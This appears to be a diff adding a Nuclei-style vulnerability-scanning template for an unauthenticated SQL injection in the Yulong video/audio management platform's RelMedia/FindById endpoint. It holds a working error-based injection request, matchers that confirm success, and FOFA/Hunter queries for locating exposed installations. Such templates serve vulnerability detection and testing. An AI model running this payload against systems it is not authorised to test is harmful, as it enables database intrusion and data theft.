@@ -1,0 +1,35 @@
+id: yulongdt-index-sqli
+info:
+  name: 誉龙视音频综合管理平台 RelMedia/FindById - sqli
+  author: leadlife
+  severity: high
+  description: 誉龙视音频综合管理平台 RelMedia/FindById 存在SQL注入漏洞，未经身份验证的远程攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E8%AA%89%E9%BE%99%E6%95%B0%E5%AD%97/%E8%AA%89%E9%BE%99%E8%A7%86%E9%9F%B3%E9%A2%91%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0FindById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="PView 视音频管理平台"
+    hunter-query: web.body="PView 视音频管理平台"
+  tags: yulongdt,sqli
+
+http:
+  - raw:
+      - |
+        POST /index.php?r=RelMedia/FindById HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1+and+updatexml(1,concat(0x7e,md5(1),0x7e),1)--+
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains(body,'c4ca4238a0b923820dcc509a6f75849')
+        condition: and
+
+  
